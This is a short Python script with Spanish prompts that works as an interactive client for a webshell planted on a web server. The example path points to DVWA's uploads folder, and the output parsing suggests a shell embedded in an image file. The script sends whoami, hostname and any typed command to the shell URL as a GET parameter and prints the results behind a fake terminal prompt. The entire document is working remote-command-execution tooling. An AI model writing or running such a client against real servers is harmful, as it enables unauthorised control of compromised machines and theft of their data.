import requests, signal, sys
from bs4 import BeautifulSoup

def ctrl_c(sig,frame):
	print("\n\n[*] Cerrando el programa...\n")
	sys.exit(0)
	
signal.signal(signal.SIGINT, ctrl_c)


cmd = 0
shell = input("Indique su webshell (EXAMPLE: http://x.x.x.x/dvwa/uploads/image.php): ")
r = requests.get(shell, params={'a' : 'whoami'})
soup = BeautifulSoup(r.text, 'html.parser')
texto = soup.pre.text
tmp1 = texto.split('ÿÛ', 1)
whoami = tmp1[0].rstrip()
r = requests.get(shell, params={'a' : 'hostname'})
soup = BeautifulSoup(r.text, 'html.parser')
texto = soup.pre.text
tmp1 = texto.split('ÿÛ', 1)
hostname = tmp1[0].rstrip()

while cmd != 'exit':
	cmd = str(input("%s@%s:~$ " % (whoami,hostname)))
	if cmd == 'clear':
		print("No se puede hacer eso en esta shell :(")
	if 'cd' in cmd:
		print("No puedes moverte por directorios en esta shell :(")
	if cmd == 'exit':
		print("Gracias por usar nuestra shell! :D")
	r = requests.get(shell, params={'a' : cmd})
	soup = BeautifulSoup(r.text, 'html.parser')
	texto = soup.pre.text
	tmp1 = texto.split('ÿÛ', 1)
	salida = tmp1[0]
	print(salida)
